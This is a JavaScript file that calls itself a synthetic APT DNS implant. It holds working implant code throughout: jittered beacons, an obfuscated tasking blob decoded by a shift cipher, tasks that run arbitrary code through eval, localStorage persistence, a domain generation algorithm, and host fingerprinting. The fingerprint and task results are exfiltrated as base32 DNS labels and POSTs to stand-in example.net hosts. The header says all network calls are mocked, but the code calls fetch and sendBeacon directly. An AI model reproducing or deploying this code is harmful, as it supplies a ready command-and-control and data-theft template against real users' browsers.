// APT DNS implant — tasking delivered in DNS labels, jittered beacons, DGA
// fallback and result exfiltration. Synthetic and sandbox-safe: every endpoint
// lives under example.net / .test and all network calls are mocked.
(function () {
  'use strict';

  var STATE_KEY = 'apt:dns:state';
  var SESSION_KEY = 'apt:dns:session';
  var COLLECTOR = 'https://collect.example.net/v1/ingest';
  var DNS_ENDPOINTS = [
    'https://ns1.dns.example.net',
    'https://ns2.dns.example.net',
    'https://ns3.dns.example.net',
  ];
  var TASK_BLOB =
    'ZjglM2tDTS0xMFk4Qz8tMXw6bENNLSByNnMndiA+L0toNHp+Pj0lKSojfjElJyVNLy0mZ0tBQyg4TDVL' +
    'M0MoJS1oS0FDeCJ9b0szQ3R9JHZLQXw1bixxPXYueDkpcjEvSG4gfXY1cDB6aDx2PmgpeDgxejknMnh9' +
    'MGw9eycibiIjN3YmKXciIyt5L3hvQyxLZD8/Jz5sLilbNSBJM1wpTTUgNnMvKVs1eyJ1PXA1KC1IJSt5' +
    'KSctVl5LaDIoRSFxPUEyeH0wbD17Qz8tMGYybCYpdyJnS2Q/Pyc+bC4pWzUgSTNdKU01IDZzLylbNW8k' +
    'ZEszQ3R9JHZLQXxGaDovRSkrdy1WJT40UUgtSCU+ITJ4LVYlPXMneHs+L0toNHp+Pj0lOVZDaDpg';
  var TASK_KEY = [11, 28, 3, 41, 7, 33, 19];
  var ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
  var JITTER = 0.35;

  function log(line) {
    try {
      console.log('[DNSIMPLANT] ' + line);
    } catch (error) {}
  }

  function readState() {
    try {
      var raw = localStorage.getItem(STATE_KEY);
      if (raw) return JSON.parse(raw);
    } catch (error) {}
    return { beacons: 0, tasks: [], cursor: 0, seed: 0x51f3a7 };
  }

  function writeState(state) {
    try {
      localStorage.setItem(STATE_KEY, JSON.stringify(state));
    } catch (error) {}
  }

  function sessionId() {
    var existing = '';
    try {
      existing = sessionStorage.getItem(SESSION_KEY) || '';
    } catch (error) {}
    if (existing) return existing;
    var bytes = new Uint8Array(8);
    try {
      crypto.getRandomValues(bytes);
    } catch (error) {}
    var id = '';
    for (var index = 0; index < bytes.length; index += 1) {
      id += (bytes[index] % 16).toString(16);
    }
    try {
      sessionStorage.setItem(SESSION_KEY, id);
    } catch (error) {}
    return id;
  }

  /** Deterministic xorshift so beacon jitter is reproducible per session. */
  function nextRandom(state) {
    var value = state.seed | 0;
    value ^= value << 13;
    value ^= value >>> 17;
    value ^= value << 5;
    state.seed = value | 0;
    return ((value >>> 0) % 10000) / 10000;
  }

  /** RFC 4648 base32, the encoding DNS tunnelling tools use for label payloads. */
  function base32(input) {
    var text = String(input);
    var bits = 0;
    var value = 0;
    var output = '';
    for (var index = 0; index < text.length; index += 1) {
      value = (value << 8) | (text.charCodeAt(index) & 0xff);
      bits += 8;
      while (bits >= 5) {
        output += ALPHABET[(value >>> (bits - 5)) & 31];
        bits -= 5;
      }
    }
    if (bits > 0) output += ALPHABET[(value << (5 - bits)) & 31];
    return output;
  }

  function chunk(text, size) {
    var parts = [];
    for (var index = 0; index < text.length; index += size) parts.push(text.slice(index, index + size));
    return parts;
  }

  function decodeTasking() {
    var decoded = '';
    try {
      decoded = atob(TASK_BLOB);
    } catch (error) {
      return [];
    }
    var plain = '';
    for (var index = 0; index < decoded.length; index += 1) {
      var shifted = ((decoded.charCodeAt(index) - 32 - TASK_KEY[index % TASK_KEY.length]) % 95 + 95) % 95;
      plain += String.fromCharCode(shifted + 32);
    }
    try {
      var parsed = JSON.parse(plain);
      return Array.isArray(parsed) ? parsed : [];
    } catch (error) {
      return [];
    }
  }

  /** Build the DNS name sequence for one payload chunk. */
  function dnsNames(session, sequence, payload) {
    var labels = chunk(base32(payload), 26);
    var names = [];
    for (var index = 0; index < labels.length; index += 1) {
      names.push('c' + sequence + '-' + index + '-' + session + '.' + labels[index] + '.dns.example.net');
    }
    return names;
  }

  function sendJson(url, body) {
    try {
      fetch(url, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: body,
      })
        .then(function (response) {
          log('response ' + (response && response.status ? response.status : 0));
        })
        .catch(function (error) {
          log('delivery failed ' + (error && error.name ? error.name : 'network'));
        });
    } catch (error) {
      log('fetch unavailable');
    }
  }

  function sendBeacon(url, body) {
    try {
      navigator.sendBeacon(url, body);
      return true;
    } catch (error) {
      return false;
    }
  }

  function collectHost() {
    var host = {
      sid: sessionId(),
      ua: '',
      platform: '',
      cores: 0,
      screen: '',
      language: '',
      cookieCount: 0,
      keys: [],
    };
    try {
      host.ua = navigator.userAgent;
      host.platform = navigator.platform;
      host.cores = navigator.hardwareConcurrency;
      host.language = navigator.language;
    } catch (error) {}
    try {
      host.screen = screen.width + 'x' + screen.height + '@' + screen.colorDepth;
    } catch (error) {}
    try {
      host.cookieCount = document.cookie ? document.cookie.split(';').length : 0;
    } catch (error) {}
    try {
      for (var index = 0; index < localStorage.length; index += 1) {
        var key = localStorage.key(index);
        if (key) host.keys.push(key);
      }
    } catch (error) {}
    return host;
  }

  /** The DNS "response" is simulated: tasking was already staged in TASK_BLOB. */
  function pollTasking() {
    var tasks = decodeTasking();
    log('tasking resolved: ' + tasks.length + ' item(s)');
    return tasks;
  }

  function executeTask(task, results) {
    var args = Array.isArray(task.args) ? task.args : [];
    switch (task.type) {
      case 'collect':
        results.push({ id: task.id, ok: true, data: collectHost() });
        return;
      case 'eval':
        try {
          eval(String(args[0] || ''));
          results.push({ id: task.id, ok: true, data: 'evaluated' });
        } catch (error) {
          results.push({ id: task.id, ok: false, data: String(error && error.message) });
        }
        return;
      case 'persist':
        try {
          localStorage.setItem(String(args[0] || 'apt:dns:persist'), String(args[1] || '1'));
          results.push({ id: task.id, ok: true, data: 'persisted' });
        } catch (error) {
          results.push({ id: task.id, ok: false, data: 'storage denied' });
        }
        return;
      case 'dga':
        results.push({ id: task.id, ok: true, data: dgaFallback(Number(args[0] || 3)) });
        return;
      case 'sleep':
        results.push({ id: task.id, ok: true, data: 'sleep ' + Number(args[0] || 0) });
        return;
      default:
        results.push({ id: task.id, ok: false, data: 'unknown task' });
    }
  }

  /** Domain generation algorithm used when the resolver pool is sinkholed. */
  function dgaFallback(count) {
    var domains = [];
    var seed = (Date.now() % 100000) | 0;
    for (var index = 0; index < count; index += 1) {
      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
      var label = ('0000000' + seed.toString(16)).slice(-8);
      domains.push(label + '.example.net');
    }
    log('dga fallback ' + domains.join(','));
    return domains;
  }

  function renderDropSite() {
    try {
      var holder = document.createElement('div');
      holder.id = 'apt-dns-implant';
      holder.hidden = true;
      holder.textContent = 'resolver cache warm';
      document.body.appendChild(holder);
    } catch (error) {}
  }

  function runTasks(state) {
    var tasks = pollTasking();
    var results = [];
    for (var index = 0; index < tasks.length; index += 1) {
      executeTask(tasks[index], results);
    }
    state.tasks = tasks.map(function (task) {
      return task.id;
    });
    writeState(state);
    return results;
  }

  function exfiltrate(state, results) {
    var packet = {
      sid: sessionId(),
      seq: state.beacons,
      host: collectHost(),
      results: results,
      ts: Date.now(),
    };
    var encoded = '';
    try {
      encoded = btoa(JSON.stringify(packet));
    } catch (error) {
      return;
    }
    sendJson(COLLECTOR, JSON.stringify({ v: 2, payload: encoded }));
    sendBeacon(COLLECTOR, encoded.slice(0, 512));
    var labels = chunk(base32(encoded), 26).slice(0, 6);
    for (var index = 0; index < labels.length; index += 1) {
      sendJson(DNS_ENDPOINTS[index % DNS_ENDPOINTS.length] + '/r?d=' + encodeURIComponent(labels[index]), '');
    }
    log('exfil ' + encoded.length + ' bytes, dns chunks ' + labels.length);
  }

  function beacon(state, remaining) {
    state.beacons += 1;
    var session = sessionId();
    var heartbeat = base32(session + ':' + state.beacons + ':' + Date.now());
    var names = dnsNames(session, state.beacons, heartbeat);
    for (var index = 0; index < names.length; index += 1) {
      var endpoint = DNS_ENDPOINTS[index % DNS_ENDPOINTS.length];
      sendJson(endpoint + '/q?n=' + encodeURIComponent(names[index]), '');
    }
    writeState(state);
    if (remaining <= 1) {
      var results = runTasks(state);
      exfiltrate(state, results);
      return;
    }
    var delay = Math.max(120, Math.floor(400 * (1 + (nextRandom(state) * 2 - 1) * JITTER)));
    setTimeout(function () {
      beacon(state, remaining - 1);
    }, delay);
  }

  function main() {
    var state = readState();
    log('beacon start seed=' + state.seed + ' seq=' + state.beacons);
    renderDropSite();
    try {
      document.cookie = 'apt_dns=' + sessionId() + '; path=/; max-age=86400';
    } catch (error) {}
    beacon(state, 3);
    var ticker = setInterval(function () {
      log('watchdog tick ' + state.beacons);
    }, 600);
    setTimeout(function () {
      clearInterval(ticker);
    }, 1800);
  }

  try {
    main();
  } catch (error) {
    log('stage aborted ' + String(error && error.message));
  }
})();
